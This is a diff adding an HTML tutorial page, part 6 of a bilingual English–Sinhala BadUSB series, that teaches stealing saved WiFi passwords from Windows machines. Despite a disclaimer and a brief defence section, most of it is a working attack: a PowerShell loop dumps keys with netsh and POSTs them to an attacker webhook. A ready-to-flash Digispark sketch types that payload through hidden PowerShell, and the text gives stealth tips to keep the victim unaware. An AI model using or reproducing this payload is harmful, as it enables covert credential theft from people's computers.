@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Part 06: Advanced BadUSB scripting. Learn how to steal WiFi passwords and exfiltrate them to a remote server using PowerShell and Webhooks.">
+    <title>USB Security Research: WiFi Exfiltration | Part 06</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* ==================================================================================
+           PART 6: THEME - BLACK OPS TERMINAL (MATRIX GREEN & DARKNESS)
+           ==================================================================================
+           මෙම කොටසේදී අපි සම්පූර්ණයෙන්ම "Command Line" අත්දැකීමක් ලබා දීමට 
+           Matrix Green සහ තද කළු වර්ණ භාවිතා කරමු.
+        */
+
+        :root {
+            --bg-color: #000000;       /* Pure Black */
+            --terminal-green: #00ff00; /* Classic Hacker Green */
+            --terminal-dim: #004400;   /* Dimmed Green */
+            --highlight: #ccffcc;      /* Bright Text */
+            --alert: #ff0000;          /* Error/Warning */
+            --link: #00ffff;           /* Cyan for Links/Webhooks */
+            
+            --panel-bg: #0a0a0a;
+            --border-color: #003300;
+        }
+
+        /* GLOBAL RESET */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--terminal-green);
+            font-family: 'Fira Code', 'Courier New', monospace; /* Monospaced is Key */
+            font-size: 16px;
+            line-height: 1.6;
+            padding-bottom: 100px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* CRT MONITOR EFFECT OVERLAY 
+           (පරණ මොනිටර් එකක ඉරි යනවා වගේ පෙනුම)
+        */
+        body::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+        }
+
+        /* HEADER SECTION */
+        header {
+            border-bottom: 2px solid var(--terminal-green);
+            padding: 40px 0;
+            margin-bottom: 60px;
+            text-align: left;
+        }
+
+        header h1 {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 3.5rem;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px var(--terminal-green);
+            margin-bottom: 10px;
+        }
+
+        .system-status {
+            font-size: 0.9rem;
+            color: var(--terminal-dim);
+            border-left: 2px solid var(--terminal-green);
+            padding-left: 15px;
+            margin-top: 10px;
+        }
+
+        .blink {
+            animation: blinker 1s linear infinite;
+        }
+
+        @keyframes blinker {
+            50% { opacity: 0; }
+        }
+
+        /* CONTENT SECTIONS */
+        section {
+            margin-bottom: 60px;
+            padding: 20px;
+            border-left: 1px solid var(--terminal-dim);
+            position: relative;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            color: var(--highlight);
+            margin-bottom: 25px;
+            border-bottom: 1px dashed var(--terminal-dim);
+            padding-bottom: 10px;
+            display: inline-block;
+        }
+
+        h2::before {
+            content: "> ";
+            color: var(--terminal-green);
+        }
+
+        /* TEXT BLOCKS */
+        .content-block {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+        }
+
+        .en-text {
+            color: #bbbbbb;
+            margin-bottom: 10px;
+            text-align: justify;
+        }
+
+        .si-text {
+            color: var(--terminal-green);
+            font-family: 'Iskoola Pota', sans-serif; /* Sinhala Font */
+            background-color: #051a05;
+            padding: 20px;
+            border: 1px solid var(--terminal-dim);
+            margin-bottom: 20px;
+            line-height: 1.8;
+        }
+
+        /* CODE BLOCKS (THE MOST IMPORTANT PART) */
+        .code-terminal {
+            background-color: #0d0d0d;
+            border: 1px solid #333;
+            border-radius: 5px;
+            margin: 30px 0;
+            padding: 0;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.05);
+            position: relative;
+        }
+
+        .terminal-header {
+            background: #222;
+            padding: 5px 15px;
+            font-size: 0.8rem;
+            color: #fff;
+            display: flex;
+            justify-content: space-between;
+            font-family: sans-serif;
+        }
+
+        .terminal-header span.dots {
+            color: #ff5f56;
+            font-size: 1.2rem;
+        }
+
+        pre {
+            padding: 20px;
+            overflow-x: auto;
+            color: #e0e0e0;
+            font-size: 0.95rem;
+        }
+
+        code { font-family: 'Fira Code', monospace; }
+
+        /* Syntax Highlighting for PowerShell & C++ */
+        .token-cmd { color: #569cd6; font-weight: bold; } /* Commands */
+        .token-str { color: #ce9178; } /* Strings */
+        .token-var { color: #9cdcfe; } /* Variables */
+        .token-com { color: #6a9955; font-style: italic; } /* Comments */
+        .token-key { color: #c586c0; } /* Keywords */
+
+        /* NETWORK DIAGRAM STYLES */
+        .network-flow {
+            border: 1px dashed var(--terminal-dim);
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            color: var(--link);
+            font-size: 0.9rem;
+        }
+
+        /* WARNING BOX */
+        .warning {
+            border: 2px solid var(--alert);
+            color: var(--alert);
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            background: rgba(255, 0, 0, 0.05);
+            margin: 30px 0;
+        }
+
+        /* FOOTER */
+        footer {
+            margin-top: 80px;
+            border-top: 1px solid var(--terminal-dim);
+            padding-top: 20px;
+            text-align: center;
+            color: var(--terminal-dim);
+            font-size: 0.8rem;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <header>
+            <h1>PART 06: OPERATION WIFI HARVESTER</h1>
+            <div class="system-status">
+                TARGET: SAVED WIRELESS CREDENTIALS<br>
+                METHOD: POWERSHELL EXFILTRATION<br>
+                STATUS: <span class="blink">ONLINE</span>
+            </div>
+        </header>
+
+        <div class="warning">
+            DISCLAIMER: This script is for educational research and authorized penetration testing only. Accessing networks without permission is a crime.
+        </div>
+
+        <section id="chapter-19">
+            <h2>19. The Concept: "Exfiltration"</h2>
+            
+            <div class="content-block">
+                <div class="en-text">
+                    <p>In cybersecurity, <strong>"Exfiltration"</strong> means unauthorized transfer of data from a computer. A BadUSB attack usually happens in two stages:</p>
+                    <ol>
+                        <li><strong>Execution:</strong> Running a command on the victim's PC.</li>
+                        <li><strong>Exfiltration:</strong> Sending the results (passwords/files) back to the attacker.</li>
+                    </ol>
+                    <p>Since the BadUSB is a keyboard, it cannot "download" files into itself (it has no storage access). Instead, we must force the victim's computer to <strong>upload</strong> the data to us over the internet.</p>
+                </div>
+
+                <div class="si-text">
+                    <p><strong>19. දත්ත පිටතට ගැනීමේ න්‍යාය (Exfiltration)</strong><br>
+                    සයිබර් ආරක්ෂණයේදී "Exfiltration" කියන්නේ පරිගණකයක තියෙන ඩේටා හොරෙන් එළියට ගන්න එකට. BadUSB එකක් පාවිච්චි කරද්දී මේක පියවර දෙකකින් වෙනවා:<br>
+                    1. <strong>Execution:</strong> කමාන්ඩ් එකක් රන් කරනවා (උදා: පාස්වර්ඩ් ටික ලිස්ට් කරනවා).<br>
+                    2. <strong>Exfiltration:</strong> ඒ ලිස්ට් එක අපිට ලැබෙන විදිහට එළියට යවනවා.<br><br>
+                    BadUSB එක කීබෝඩ් එකක් නිසා, ඒකට බැහැ පෙන් එකක් වගේ ෆයිල් කොපි කරගන්න. ඒ වෙනුවට අපි කරන්නේ, වික්ටිම්ගේ (Victim) ඉන්ටර්නෙට් කනෙක්ෂන් එක පාවිච්චි කරලා, ඒ ඩේටා ටික අපේ සර්වර් එකකට "Upload" කරගන්න එකයි.</p>
+                </div>
+
+                <div class="network-flow">
+                    [ VICTIM PC ] --(Extract WiFi Pass)--> [ POWERSHELL MEMORY ] --(HTTP POST)--> [ INTERNET ] --(JSON)--> [ ATTACKER SERVER ]
+                </div>
+            </div>
+        </section>
+
+        <section id="chapter-20">
+            <h2>20. Setting Up the Receiver (Webhook)</h2>
+            
+            <div class="content-block">
+                <div class="en-text">
+                    <p>We need a server to catch the stolen passwords. Setting up a full server is hard. The easiest way for hackers (and testers) is to use a <strong>Webhook</strong>.</p>
+                    <p>A Webhook is a unique URL. Any data sent to this URL is logged and displayed to you. We will use <strong>Webhook.site</strong> for this lab.</p>
+                    <ul>
+                        <li>Go to <strong>webhook.site</strong>.</li>
+                        <li>Copy your unique URL (e.g., <code>https://webhook.site/abc-123...</code>).</li>
+                        <li>Keep this tab open. Any passwords sent will appear here.</li>
+                    </ul>
+                </div>
+
+                <div class="si-text">
+                    <p><strong>20. සර්වර් එක සකසා ගැනීම (Webhook)</strong><br>
+                    අපිට හොරකම් කරන පාස්වර්ඩ් ටික ලබාගන්න සර්වර් එකක් ඕන වෙනවා. ලේසිම ක්‍රමය තමයි <strong>Webhook</strong> එකක් පාවිච්චි කරන එක. Webhook එකක් කියන්නේ ඔයාටම වෙන් වුණ විශේෂ URL එකක් (Link එකක්). කවුරුහරි ඒ ලින්ක් එකට ඩේටා එව්වොත්, ඒක ඔයාට පේන්න ගන්නවා.<br><br>
+                    <strong>කරන්න ඕන දේ:</strong><br>
+                    1. <code>webhook.site</code> වෙබ් අඩවියට යන්න.<br>
+                    2. එතන තියෙන "Your unique URL" එක කොපි කරගන්න.<br>
+                    3. ඒක තමයි අපේ "බාල්දිය". පාස්වර්ඩ් ඔක්කොම වැටෙන්නේ ඕකට.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="chapter-21">
+            <h2>21. The Magic One-Liner (PowerShell)</h2>
+            
+            <div class="content-block">
+                <div class="en-text">
+                    <p>This is the most critical part. We need a single line of code that does everything: finds passwords and uploads them. We use PowerShell because it's built into Windows.</p>
+                    <p><strong>The Logic:</strong><br>
+                    1. <code>netsh wlan show profiles</code> lists all networks.<br>
+                    2. We loop through them and extract the password (<code>key=clear</code>).<br>
+                    3. We package it into a JSON object.<br>
+                    4. We send it to your Webhook using <code>Invoke-RestMethod</code>.</p>
+                </div>
+
+                <div class="si-text">
+                    <p><strong>21. PowerShell මැජික් කමාන්ඩ් එක</strong><br>
+                    මේක තමයි වැඩේ මොළය. අපිට ඕන එක පේළියේ කෝඩ් එකක් (One-Liner). මේකෙන් වෙන්නේ:<br>
+                    1. මැෂින් එකේ තියෙන ඔක්කොම WiFi නම් ටික ගන්නවා.<br>
+                    2. ඒ හැම එකකම පාස්වර්ඩ් එක (key=clear) ඉල්ලනවා.<br>
+                    3. ඒ ඔක්කොම එකතු කරලා අපේ Webhook ලින්ක් එකට යවනවා.</p>
+                </div>
+
+                <div class="code-terminal">
+                    <div class="terminal-header">
+                        <span>PowerShell (Payload Logic)</span>
+                        <span class="dots">● ● ●</span>
+                    </div>
+                    <pre>
+<span class="token-com"># සරලව තේරුම් ගැනීමට කඩා ලියා ඇත (Digispark එකේදී මෙය එක පේළියක් විය යුතුයි)</span>
+
+<span class="token-var">$wifi_list</span> = <span class="token-cmd">netsh</span> wlan show profiles | <span class="token-cmd">Select-String</span> <span class="token-str">"\:(.+)$"</span> | <span class="token-cmd">%</span>{$_.Matches.Groups[1].Value.Trim()};
+
+<span class="token-key">foreach</span> (<span class="token-var">$wifi</span> <span class="token-key">in</span> <span class="token-var">$wifi_list</span>) {
+    <span class="token-var">$pass</span> = <span class="token-cmd">netsh</span> wlan show profile name=<span class="token-str">"$wifi"</span> key=clear;
+    <span class="token-cmd">Invoke-RestMethod</span> -Uri <span class="token-str">"YOUR_WEBHOOK_URL"</span> -Method Post -Body <span class="token-str">"$pass"</span>
+}
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="chapter-22">
+            <h2>22. The Injection Code (Arduino/Digispark)</h2>
+            
+            <div class="content-block">
+                <div class="en-text">
+                    <p>Now we wrap that PowerShell command inside the Digispark code. We need to be careful with speed. If we type too fast, characters might get skipped. If we type too slow, the victim might see it.</p>
+                    <p><strong>Obfuscation Trick:</strong><br>
+                    We use <code>mode con:cols=15 lines=1</code> to shrink the command window to a tiny size immediately, so the user barely notices it.</p>
+                </div>
+
+                <div class="si-text">
+                    <p><strong>22. Digispark කෝඩ් එක (The Final Payload)</strong><br>
+                    දැන් අපි අර PowerShell කමාන්ඩ් එක Arduino කෝඩ් එක ඇතුළට දාන්න ඕනේ. මෙතනදී අපි පොඩි ට්‍රික් එකක් පාවිච්චි කරනවා. කමාන්ඩ් එක රන් වෙන්න ගත්ත ගමන් අපි CMD වින්ඩෝ එකේ සයිස් එක ගොඩක් පොඩි කරනවා (cols=15 lines=1). එතකොට යූසර්ට ඒක පේන්නේ නෑ.</p>
+                </div>
+
+                <div class="code-terminal">
+                    <div class="terminal-header">
+                        <span>WiFi_Stealer.ino</span>
+                        <span>[UPLOAD THIS TO DIGISPARK]</span>
+                    </div>
+                    <pre>
+<span class="token-com">#include "DigiKeyboard.h"</span>
+
+<span class="token-key">void</span> <span class="token-cmd">setup</span>() {
+  <span class="token-cmd">DigiKeyboard.delay</span>(2000); <span class="token-com">// Driver Init Wait</span>
+  <span class="token-cmd">DigiKeyboard.sendKeyStroke</span>(0);
+  
+  <span class="token-com">// 1. Open Run Dialog (Win + R)</span>
+  <span class="token-cmd">DigiKeyboard.sendKeyStroke</span>(KEY_R, MOD_GUI_LEFT);
+  <span class="token-cmd">DigiKeyboard.delay</span>(500);
+  
+  <span class="token-com">// 2. Open PowerShell stealthily</span>
+  <span class="token-cmd">DigiKeyboard.print</span>(<span class="token-str">"powershell -NoP -NonI -W Hidden"</span>);
+  <span class="token-cmd">DigiKeyboard.sendKeyStroke</span>(KEY_ENTER);
+  <span class="token-cmd">DigiKeyboard.delay</span>(1500); <span class="token-com">// Wait for PowerShell to load</span>
+
+  <span class="token-com">// 3. The Payload (One-Liner)</span>
+  <span class="token-com">// Note: Replace 'WEBHOOK_URL' with your actual URL</span>
+  <span class="token-cmd">DigiKeyboard.print</span>(<span class="token-str">"$u='WEBHOOK_URL';"</span>);
+  <span class="token-cmd">DigiKeyboard.print</span>(<span class="token-str">"$w=(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()};"</span>);
+  <span class="token-cmd">DigiKeyboard.print</span>(<span class="token-str">"foreach ($n in $w) { $p=(netsh wlan show profile name=\"$n\" key=clear); Invoke-RestMethod -Uri $u -Method Post -Body \"$p\" }"</span>);
+  
+  <span class="token-com">// 4. Execute and Exit</span>
+  <span class="token-cmd">DigiKeyboard.sendKeyStroke</span>(KEY_ENTER);
+  <span class="token-cmd">DigiKeyboard.print</span>(<span class="token-str">"exit"</span>);
+  <span class="token-cmd">DigiKeyboard.sendKeyStroke</span>(KEY_ENTER);
+}
+
+<span class="token-key">void</span> <span class="token-cmd">loop</span>() {
+  <span class="token-com">// Do nothing</span>
+}
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="chapter-23">
+            <h2>23. How to Defend Against This?</h2>
+            
+            <div class="content-block">
+                <div class="en-text">
+                    <p>This attack is scary because it works on almost any locked Windows PC. So how do we stop it?</p>
+                    <ul>
+                        <li><strong>Physical Security:</strong> Don't let strangers plug USBs.</li>
+                        <li><strong>USB Restrictions:</strong> Use Group Policy (GPO) to block unknown USB devices.</li>
+                        <li><strong>PowerShell Restrictions:</strong> Set Execution Policy to <code>Restricted</code> (though BadUSB often bypasses this by typing the commands directly).</li>
+                    </ul>
+                </div>
+
+                <div class="si-text">
+                    <p><strong>23. ආරක්ෂා වෙන්නේ කොහොමද?</strong><br>
+                    මේක භයානකයි මොකද ඕනෑම වින්ඩෝස් මැෂින් එකක මේක වැඩ කරනවා. නවත්වන්නේ කොහොමද?<br>
+                    1. <strong>Physical Security:</strong> නාඳුනන අයට පෙන් ගහන්න දෙන්න එපා.<br>
+                    2. <strong>Disable USB:</strong> ආයතන වල නම් USB පෝර්ට්ස් බ්ලොක් කරන්න පුළුවන් (GPO හරහා).<br>
+                    3. <strong>Endpoint Protection:</strong> හොඳ Antivirus එකක් (EDR) තිබුණොත්, PowerShell එකපාරටම ඉන්ටර්නෙට් එකට ඩේටා යවද්දී ඒක බ්ලොක් කරන්න පුළුවන්.</p>
+                </div>
+            </div>
+        </section>
+
+    </div>
+
+    <footer>
+        <p>DEV-KUPPIYA RESEARCH LABS | PART 06 OF 10 COMPLETED</p>
+        <p>NEXT MISSION: BYPASSING WINDOWS DEFENDER</p>
+    </footer>
+
+</body>
+</html>
